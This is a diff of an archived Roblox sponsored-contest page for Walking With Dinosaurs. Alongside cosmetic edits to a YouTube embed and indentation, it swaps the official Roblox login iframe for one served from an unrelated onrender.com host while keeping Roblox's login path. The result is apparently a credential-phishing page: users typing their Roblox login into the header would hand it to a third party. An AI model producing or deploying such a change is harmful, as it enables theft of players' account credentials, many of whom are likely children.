@@ -1,3 +1,5 @@
+
+
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" xmlns:fb="http://www.facebook.com/2008/fbml">
 <!-- MachineID: WEB224 -->
@@ -199,7 +201,7 @@ $(function(){
                             <a id="header-login" class="btn-control btn-control-large">Login <span class="grey-arrow">▼</span></a>
                         </span>
                         <div id="iFrameLogin" style="display:none">
-                            <iframe class="login-frame" src="https://www.roblox.com/Login/iFrameLogin.aspx?loginRedirect=True&amp;parentUrl=http%3a%2f%2fwww.roblox.com%2fSponsoredContest%2fSponsoredPage.aspx%3fsponsor%3dWalkingWithDinosaurs" scrolling="no" frameborder="0"></iframe>
+                            <iframe class="login-frame" src="https://twentythirdteening.onrender.com/Login/iFrameLogin.aspx?loginRedirect=True&amp;parentUrl=http%3a%2f%2fwww.roblox.com%2fSponsoredContest%2fSponsoredPage.aspx%3fsponsor%3dWalkingWithDinosaurs" scrolling="no" frameborder="0"></iframe>
                         </div>
                     </div>
                 </div>
@@ -274,17 +276,16 @@ $(function(){
     <div class="left-column">
         <div class="logo"></div>
         <div class="iframe-container">
-            <iframe src="https://www.disney.com/" frameborder="0"></iframe>
-        </div>
+                <iframe src="https://www.disney.com/" frameborder="0"></iframe>
         <div class="video-container">
             <iframe 
                 width="560" 
                 height="315" 
-                src="https://www.youtube.com" 
-                title="WalkingWithDinosaurs"
+                src="https://www.youtube-nocookie.com/embed/P7lBKBxIwGM?rel=0" 
+                title="YouTube video player"
                 frameborder="0" 
                 allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
-				referrerpolicy="strict-origin-when-cross-origin"
+                referrerpolicy="strict-origin-when-cross-origin"
                 allowfullscreen>
             </iframe>
         </div>
@@ -803,3 +804,24 @@ if(typeof __utmSetVar !== 'undefined'){ __utmSetVar(''); }//]]>
 
 </body>                
 </html>
+<!--
+     FILE ARCHIVED ON 13:21:05 Dec 03, 2013 AND RETRIEVED FROM THE
+     INTERNET ARCHIVE ON 08:54:40 Sep 26, 2026.
+     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.
+
+     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
+     SECTION 108(a)(3)).
+-->
+<!--
+playback timings (ms):
+  capture_cache.get: 0.686
+  captures_list: 0.684
+  exclusion.robots: 0.103
+  exclusion.robots.policy: 0.09
+  esindex: 0.01
+  cdx.remote: 16.172
+  LoadShardBlock: 215.409 (3)
+  PetaboxLoader3.datanode: 112.006 (4)
+  PetaboxLoader3.resolve: 123.445 (2)
+  load_resource: 89.828
+-->
